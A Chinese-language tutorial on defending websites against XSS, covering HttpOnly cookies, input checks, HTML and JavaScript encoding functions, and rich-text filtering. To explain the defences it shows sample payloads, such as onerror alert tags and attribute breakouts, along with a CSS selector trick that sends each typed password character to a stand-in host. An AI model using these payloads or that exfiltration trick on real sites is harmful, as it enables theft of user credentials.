---

---

# 简介

`XSS` 的防御很复杂，并不是一套防御机制就能就解决的问题，它需要具体业务具体实现。

目前来说，流行的浏览器内都内置了一些 `XSS 过滤器`，但是这只能防御一部分常见的 `XSS`，而对于网站来说，也应该一直寻求优秀的解决方案，保护网站及用户的安全，我将阐述一下网站在设计上该如何避免 `XSS` 的攻击。


# `HttpOnly`

`HttpOnly` 最早是由微软提出，并在 `IE 6` 中实现的，至今已经逐渐成为一个标准，各大浏览器都支持此标准。具体含义就是，如果某个 `Cookie` 带有 `HttpOnly` 属性，那么这一条 `Cookie` 将被禁止读取，也就是说，`JavaScript` 读取不到此条 `Cookie`，不过在与服务端交互的时候，`Http Request` 包中仍然会带上这个 `Cookie` 信息，即我们的正常交互不受影响。

`Cookie` 是通过 `http response header` 种到浏览器的，我们来看看设置 `Cookie` 的语法：

```javascript
Set-Cookie: <name>=<value>[; <Max-Age>=<age>][; expires=<date>][; domain=<domain_name>][; path=<some_path>][; secure][; HttpOnly]

```

第一个是 `name=value` 的键值对，然后是一些属性，比如失效时间，作用的 `domain` 和 `path` ，最后还有两个标志位，可以设置为 `secure` 和 `HttpOnly`。

栗子：

```javascript
// 利用 express 这个轮子设置cookie
res.cookie('myCookie', 'test', {
  httpOnly: true
})
res.cookie('myCookie2', 'test', {
  httpOnly: false
})
```

然后回到浏览器查看：

![image-20180926162748454](http://md-1255362963.cos.ap-chengdu.myqcloud.com/2018-09-26-082748.png)

这个时候我们试着在控制台输出：

![image-20180926163041071](https://md-1255362963.cos.ap-chengdu.myqcloud.com/2018-09-26-083041.png)

我们发现，只有没有设置 `HttpOnly` 的 `myCookie2` 输出了出来，这样一来， `javascript` 就读取不到这个 `Cookie` 信息了。

`HttpOnly` 的设置过程十分简单，而且效果明显，不过需要注意的是，所有需要设置 `Cookie` 的地方，都要给关键的 `Cookie` 都加上 `HttpOnly` ，若有遗漏则会功亏一篑。

但是， `HttpOnly` 不是万能的，添加了 `HttpOnly` 不等于解决了 `XSS` 问题。

严格的说，`HttpOnly` 并非为了对抗 `XSS` ，`HttpOnly` 解决的是 `XSS` 后的 `Cookie` 劫持问题，但是 `XSS` 攻击带来的不仅仅是 `Cookie` 劫持问题，还有窃取用户信息，模拟身份登录，操作用户账户等一系列行为。

使用 `HttpOnly` 有助于缓解 `XSS` 攻击，但是仍然需要其他能够解决 `XSS` 漏洞的方案。

# 输入检查

**记住一点：不要相信任何输入的内容。**

无论是不是做了安全校验，都必须进行过滤操作，而且需要后台配合过滤，如果后端的检查校验还做得不好，那就可能被攻破。

输入检查在更多的时候被用于格式检验，例如用户名只能以字母和数字组合，手机号码只能有 11 位且全部为数字，否则即为非法。

这些格式检查类似于白名单效果，限制输入允许的字符，让一下特殊字符的攻击失效。

目前网上有很多开源的 `XSS Filter` ，这些 `XSS Filter` 目前来说还是有些效果的，能只能检验输入内容，高级一点的还会匹配 `XSS` 特征，例如内容是否包含了 `<script>`，`javascript` 等敏感字符，但是这些 `XSS Filter` 只是获取到了用户的输入内容，并不了解其上下文含义，很多时候会误过滤。

例如：

用户输入昵称：`<|无敌是多么鸡毛|>`，对于 `XSS Filter` 来说，`<>` 就是特殊字符，需要过滤然后过滤成为 `|无敌是多么鸡毛|` ，直接改变了用户的昵称。

所以，我们不能完全信赖开源的 `XSS Filter` ，很多场景需要我们自己配置规则，进行过滤。

# 输出检查

不要以为在输入的时候进行过滤就万事大吉了，恶意攻击者们可能会层层绕过防御机制进行 `XSS` 攻击，一般来说，所有需要输出到 `HTML` 页面的变量，全部需要使用编码或者转义来防御。

## `HTMLEncode`

针对 `HTML` 代码的编码方式是 `HTMLEncode`，它的作用是将字符串转换成 `HTMLEntities`。

目前来说，为了对抗 `XSS` ，以下转义内容是必不可少的：

| 特殊字符 | 实体编码 |
| :------- | :------- |
| &        | &amp ;   |
| <        | &lt ;    |
| >        | &gt ;    |
| "        | &quot ;  |
| '        | &#x27 ;  |
| /        | &#x2F ;  |
|          |          |

PS. **`;` 是必须的，而且要和前面的字符连接起来，我这边分开是因为，`markdown`  就是 `HTML` 语言，我连上就直接转义成前面的特殊字符了，/(ㄒoㄒ)/~~**

来看看效果：

![image-20180926213835914](http://md-1255362963.cos.ap-chengdu.myqcloud.com/2018-09-26-133839.png)

![image-20180926213904413](http://md-1255362963.cos.ap-chengdu.myqcloud.com/2018-09-26-133908.png)

可以看到，这些编码在 `HTML` 上已经成功转成了对应的符号。

当然，上面的只是最基本而且是最必要的，`HTMLEncode` 还有很多很多，我这边列举了一些（请允许我用代码的形式写出来，这样就不会转义了）：

```javascript
const HtmlEncode = (str) => {
    // 设置 16 进制编码，方便拼接
    const hex = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'];
    // 赋值需要转换的HTML
    const preescape = str;
    let escaped = "";
    for (let i = 0; i < preescape.length; i++) {
        // 获取每个位置上的字符
        let p = preescape.charAt(i);
        // 重新编码组装
        escaped = escaped + escapeCharx(p);
    }

    return escaped;
    // HTMLEncode 主要函数
    // original 为每次循环出来的字符
    function escapeCharx(original) {
        // 默认查到这个字符编码
        let found = true;
        // charCodeAt 获取 16 进制字符编码
        const thechar = original.charCodeAt(0);
        switch (thechar) {
            case 10: return "<br/>"; break; // 新的一行
            case 32: return "&nbsp;"; break; // space
            case 34: return "&quot;"; break; // "
            case 38: return "&amp;"; break; // &
            case 39: return "&#x27;"; break; // '
            case 47: return "&#x2F;"; break; // /
            case 60: return "&lt;"; break; // <
            case 62: return "&gt;"; break; // >
            case 198: return "&AElig;"; break; // Æ
            case 193: return "&Aacute;"; break; // Á
            case 194: return "&Acirc;"; break; // Â
            case 192: return "&Agrave;"; break; // À
            case 197: return "&Aring;"; break; // Å
            case 195: return "&Atilde;"; break; // Ã
            case 196: return "&Auml;"; break; // Ä
            case 199: return "&Ccedil;"; break; // Ç
            case 208: return "&ETH;"; break; // Ð
            case 201: return "&Eacute;"; break; // É
            case 202: return "&Ecirc;"; break;
            case 200: return "&Egrave;"; break;
            case 203: return "&Euml;"; break;
            case 205: return "&Iacute;"; break;
            case 206: return "&Icirc;"; break;
            case 204: return "&Igrave;"; break;
            case 207: return "&Iuml;"; break;
            case 209: return "&Ntilde;"; break;
            case 211: return "&Oacute;"; break;
            case 212: return "&Ocirc;"; break;
            case 210: return "&Ograve;"; break;
            case 216: return "&Oslash;"; break;
            case 213: return "&Otilde;"; break;
            case 214: return "&Ouml;"; break;
            case 222: return "&THORN;"; break;
            case 218: return "&Uacute;"; break;
            case 219: return "&Ucirc;"; break;
            case 217: return "&Ugrave;"; break;
            case 220: return "&Uuml;"; break;
            case 221: return "&Yacute;"; break;
            case 225: return "&aacute;"; break;
            case 226: return "&acirc;"; break;
            case 230: return "&aelig;"; break;
            case 224: return "&agrave;"; break;
            case 229: return "&aring;"; break;
            case 227: return "&atilde;"; break;
            case 228: return "&auml;"; break;
            case 231: return "&ccedil;"; break;
            case 233: return "&eacute;"; break;
            case 234: return "&ecirc;"; break;
            case 232: return "&egrave;"; break;
            case 240: return "&eth;"; break;
            case 235: return "&euml;"; break;
            case 237: return "&iacute;"; break;
            case 238: return "&icirc;"; break;
            case 236: return "&igrave;"; break;
            case 239: return "&iuml;"; break;
            case 241: return "&ntilde;"; break;
            case 243: return "&oacute;"; break;
            case 244: return "&ocirc;"; break;
            case 242: return "&ograve;"; break;
            case 248: return "&oslash;"; break;
            case 245: return "&otilde;"; break;
            case 246: return "&ouml;"; break;
            case 223: return "&szlig;"; break;
            case 254: return "&thorn;"; break;
            case 250: return "&uacute;"; break;
            case 251: return "&ucirc;"; break;
            case 249: return "&ugrave;"; break;
            case 252: return "&uuml;"; break;
            case 253: return "&yacute;"; break;
            case 255: return "&yuml;"; break;
            case 162: return "&cent;"; break;
            case '\r': break;
            default: found = false; break;
        }
        if (!found) {
            // 如果和上面内容不匹配且字符编码大于127的话，用unicode(非常严格模式)
            if (thechar > 127) {
                let c = thechar;
                let a4 = c % 16;
                c = Math.floor(c / 16);
                let a3 = c % 16;
                c = Math.floor(c / 16);
                let a2 = c % 16;
                c = Math.floor(c / 16);
                let a1 = c % 16;
                return "&#x" + hex[a1] + hex[a2] + hex[a3] + hex[a4] + ";";
            } else {
                return original;
            }
        }
    }
}
```

emmmm……作者比较懒，剩下的注释自己补充，这应该是比较全的 `HTMLEncode` 编码转换了，大家可以直接拿去用（可以给个赞不~），来让我们测试一下：

```html
<div id="id"></div>
```



```javascript
// 当我们输入：
document.querySelector('#id').innerHTML = '<img onerror=alert(1) src=1/>'
```



页面不可避免的发生了 `XSS` 注入：

![image-20180926224132524](http://md-1255362963.cos.ap-chengdu.myqcloud.com/2018-09-26-144134.png)

```javascript
// 当我们利用 HTMLEncode 之后
document.querySelector('#id').innerHTML = HtmlEncode('<img onerror=alert(1) src=1/>')
console.log(HtmlEncode('<img onerror=alert(1) src=1/>'))
```

发现页面将输入的内容完全呈现了：

![image-20180926224340611](http://md-1255362963.cos.ap-chengdu.myqcloud.com/2018-09-26-144341.png)



## `JavaScriptEncode`

`JavaScriptEncode` 与 `HTMLEncode` 的编码方式不同，它需要用 `\` 对特殊字符进行转义。

在对抗 `XSS` 时，还要求输出的变量必须在引号内部，以免造成安全问题，可是很多开发者并没有这种习惯，这样只能使用更为严格的 `JavaScriptEncode` 来保证数据安全：除了数字，字符之外的所有字符，小于127的字符编码都使用十六进制 `\xHH` 的方式进行编码，大于用unicode（非常严格模式）。

同样是代码的方式展现出来：

```javascript
//使用“\”对特殊字符进行转义，除数字字母之外，小于127使用16进制“\xHH”的方式进行编码，大于用unicode（非常严格模式）。
// 大部分代码和上面一样，我就不写注释了
const JavaScriptEncode = function (str) {
    const hex = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'];
    const preescape = str;
    let escaped = "";
    for (let i = 0; i < preescape.length; i++) {
        escaped = escaped + encodeCharx(preescape.charAt(i));
    }
    return escaped;
    // 小于127转换成十六进制
    function changeTo16Hex(charCode) {
        return "\\x" + charCode.charCodeAt(0).toString(16);
    }
    function encodeCharx(original) {
        let found = true;
        const thecharchar = original.charAt(0);
        const thechar = original.charCodeAt(0);
        switch (thecharchar) {
            case '\n': return "\\n"; break; //newline
            case '\r': return "\\r"; break; //Carriage return
            case '\'': return "\\'"; break;
            case '"': return "\\\""; break;
            case '\&': return "\\&"; break;
            case '\\': return "\\\\"; break;
            case '\t': return "\\t"; break;
            case '\b': return "\\b"; break;
            case '\f': return "\\f"; break;
            case '/': return "\\x2F"; break;
            case '<': return "\\x3C"; break;
            case '>': return "\\x3E"; break;
            default: found = false; break;
        }
        if (!found) {
            if (thechar > 47 && thechar < 58) { //数字
                return original;
            }
            if (thechar > 64 && thechar < 91) { //大写字母
                return original;
            }
            if (thechar > 96 && thechar < 123) { //小写字母
                return original;
            }
            if (thechar > 127) { //大于127用unicode
                let c = thechar;
                let a4 = c % 16;
                c = Math.floor(c / 16);
                let a3 = c % 16;
                c = Math.floor(c / 16);
                let a2 = c % 16;
                c = Math.floor(c / 16);
                let a1 = c % 16;
                return "\\u" + hex[a1] + hex[a2] + hex[a3] + hex[a4] + "";
            } else {
                return changeTo16Hex(original);
            }
        }
    }
}
```

除了 `HTMLEncode` 和 `JavaScript` 外，还有许多用于各种情况的编码函数，比如 `XMLEncode` 、`JSONEncode` 等。

编码函数需要在适当的情况下用适当的函数，需要注意的是，编码之后数据长度发生改变，如果文件对数据长度有所限制的话，可能会影响到某些功能。我们在使用编码函数时，一定要注意这个细节，以免产生不必要的 `bug`。

# 正确的防御 `XSS`

上面说了两种转义只是为了设计个人能更好的 `XSS` 防御方案，但是我们需要认清 `XSS` 产生的本质原因。

`XSS` 的本质还是一种 `HTML 注入`，用户的数据被当成了 `HTML` 代码一部分来执行，从而混淆了原本的语意，产生了新的语意。

如果网站使用了 `MVC(MVVM)` 结构，那么 `XSS` 就会发生在 `View` 层，也就是变量拼接到页面时产生的，所以在用户提交数据的时候进行输入检查，并不是真正在被攻击的地方做防御，而是预防攻击，下面，我将总结一些 `XSS` 发生的场景，再一一解决。

## 在 `HTML` 标签中输出

在 `HTML` 标签中直接输出变量，没有做任何处理，会导致 `XSS`。

```html
<a href=# ><img src=1 onerror=alert(1)></a>
```

这种方式的解决方案是，所有需要输出到页面的元素全部通过 `HTMLEncode`。

## 在 `HTML` 属性中输出

在和 `HTML` 标签中输出攻击方式类似，只不过输出的内容会自动闭合标签。

```html
<a href="我是变量" ></a>
<!-- 我是变量: "><img src=1 onerror=alert(1)><" -->
<!-- 插入之后变为 -->
<a href=""><img src=1 onerror=alert(1)><""></a>
```

这种方式的防御方法仍然是 `HTMLEncode` 。

## 在 `<script>` 标签中输出

假设我们的变量都在引号内部：

```javascript
let a = "我是变量"
// 我是变量 = ";alert(1);//
a = "";alert(1);//"
```

攻击者只需要闭合标签就能实行攻击，目前的防御方法为 `JavaScriptEncode`。

## 在 `CSS` 中输出

在 `CSS` 中或者 `style` 标签或者 `style attribute` 中形成的攻击花样非常多，总体上类似于下面几个例子：

```html
<style>@import url('http:xxxxx')</style>
<style>@import 'http:xxxxx'</style>
<style>li {list-style-image: url('xxxxxx')}</style>
<style>body {binding:url('xxxxxxxxxx')}</style>
<div style='background-image: url(xxxx)'></div>
<div style='width: expression(xxxxx)'></div>
```

要解决 `CSS` 的攻击问题，一方面要严格控制用户将变量输入`style` 标签内，另一方面不要引用未知的 `CSS` 文件，如果一定有用户改变 `CSS` 变量这种需求的话，可以使用 `OWASP ESAPI` 中的 `encodeForCSS()` 函数。

一个很典型的第三方 `CSS` 库攻击的案例：

```css
input[type="password"][value$="0"]{ background-image: url("http://localhost:3000/0") }
input[type="password"][value$="1"]{ background-image: url("http://localhost:3000/1") }
input[type="password"][value$="2"]{ background-image: url("http://localhost:3000/2") }
input[type="password"][value$="3"]{ background-image: url("http://localhost:3000/3") }
input[type="password"][value$="4"]{ background-image: url("http://localhost:3000/4") }
input[type="password"][value$="5"]{ background-image: url("http://localhost:3000/5") }
input[type="password"][value$="6"]{ background-image: url("http://localhost:3000/6") }
input[type="password"][value$="7"]{ background-image: url("http://localhost:3000/7") }
input[type="password"][value$="8"]{ background-image: url("http://localhost:3000/8") }
input[type="password"][value$="9"]{ background-image: url("http://localhost:3000/9") }
...
```

剩下的就不写了，就是将所有键盘能输入的字符都写进去。

`input[type="password"]` 是css选择器，作用是选择密码输入框，`[value$="0"]`表示匹配输入的值是以 0 结尾的。

所以如果你在密码框中输入 0 ，就去请求 `http://localhost:3000/0 ` 接口，但是浏览器默认情况下是不会将用户输入的值存储在 `value` 属性中，但是有的框架会同步这些值，例如`React` 。

我们模拟同步 `value` 值：

```html
<body>
  <input type="password" value="" id="pwd">
</body>
<script>
  const pwd = document.querySelector('#pwd');
  pwd.oninput = (e) => {
    pwd.attributes.value.value = e.target.value
  }
</script>
```

然后我们看看效果：

![Jietu20180927-150717-HD](http://md-1255362963.cos.ap-chengdu.myqcloud.com/2018-09-27-070810.gif)

看！你的密码都被发送到远程了，所以输 `CSS` 也是 `XSS` 攻击的手段之一，只有想不到，没有做不到~

## 在 `URL` 中输出

在地址张输出也比较复杂。一般来说 `URL` 的 `path` 或者 `search` 中进行攻击直接使用 `URLEncode` 即可。`URLEncode` 会将字符串转换为 `%HH` 的形式，类似空格就是 `%20`。

可能的攻击方法就是：

```html
<!-- 原始 URL -->
<a href="http://localhost:3000/?test=我是变量"></a>
<!-- 攻击 URL -->
<a href="http://localhost:3000/?test=" onclick=alert(1)""></a>
<!-- URLEncode -->
<a href="http://localhost:3000/?test=%22%20onclick%3balert%281%29%22"></a>
```

但是是否用了 `URLEncode` 就万事大吉了呢？

不不不

如果整个 `URL` 被用户控制，那么前面的 `http://`， `localhost:3000` 等部分被转义不就乱套了，这些部分是不能被转义的。

一个 `URL` 的组成如下：

`[Protocal][Host][Path][Search][Hash]`

栗子：

`http://localhost:3000/a/b/c?search=123#666aaa`

`[Protocal]` 对应 `http://`

`[Host]` 对应 `localhost:3000`

`[Path]` 对应 `/a/b/c`

`[Search]` 对应 `?search=123`

`[Hash]` 对应 `#666aaa`

一般来说，如果变量是整个 `URL` ，则应该先检查变量是否以 `http` 开头，在此之后再对里面的变量进行 `URLEncode` 。

## 富文本处理

在一些网站，网站允许用户富含 `HTML` 标签的代码，比如文本里面要有图片、视频之类，这些文本展现出来全都是依靠 `HTML` 代码来实现。

那么，我们需要如何区分安全的 `富文本` 和 `XSS` 攻击呢？

我正好在华为做过相关的富文本过滤操作，基本的思想就是：

1. 首先进行输入检查，保证用户输入的是完整的 `HTML` 代码，而不是有拼接的代码
2. 通过 `htmlParser` 解析出 `HTML` 代码的标签、属性、事件
3. `富文本` 的 `事件` 肯定要被禁止，因为`富文本` 并不需要 `事件` 这种东西，另外一些危险的标签也需要禁止，例如： `<iframe>`，`<script>`，`<base>`，`<form>` 等
4. 利用白名单机制，只允许安全的标签嵌入，例如：`<a>`，`<img>`，`div`等，白名单不仅仅适用于标签，也适用于`属性`
5. 过滤用户 `CSS` ，检查是否有危险代码

# 小结

理论上来说，`XSS` 漏洞虽然复杂，但是却是可以彻底解决掉的，在设计 `XSS` 解决方案时，要结合目前的业务需求，从业务风险角度定义每个 `XSS` 漏洞，针对不同的场景使用不同的方法，同时，很多开源的项目可以借鉴参考，完善自己的 `XSS` 解决方案。